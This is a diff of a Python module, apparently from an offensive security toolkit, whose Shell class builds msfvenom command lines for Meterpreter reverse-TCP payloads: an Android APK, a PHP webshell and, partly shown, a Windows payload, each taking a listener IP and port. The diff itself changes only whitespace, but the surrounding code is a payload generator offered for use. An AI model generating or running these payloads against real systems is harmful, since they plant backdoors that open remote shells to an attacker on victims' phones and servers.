@@ -1,6 +1,7 @@
 # encoding: utf8
 from .config import *
 
+
 class Shell:
     def __init__(self):
         self.info = {
@@ -8,8 +9,6 @@ class Shell:
             'Author': 'whois',
             'Update': '2019/1/29',
         }
-
-   
 
     def meter_re_windows(self, ip, port):
         return """
@@ -33,7 +32,7 @@ class Shell:
 
     def meter_re_android(self, ip, port):
         return "msfvenom -p android/meterpreter/reverse_tcp lhost={0} lport={1} -f raw -o test.apk".format(ip, port)
-    
+
     def meter_re_webshell(self, ip, port):
         return """
             \rmsfvenom -p php/meterpreter/reverse_tcp -f raw --platform php -e generic/none -a php LHOST={0} LPORT={1} -o shell.php\n
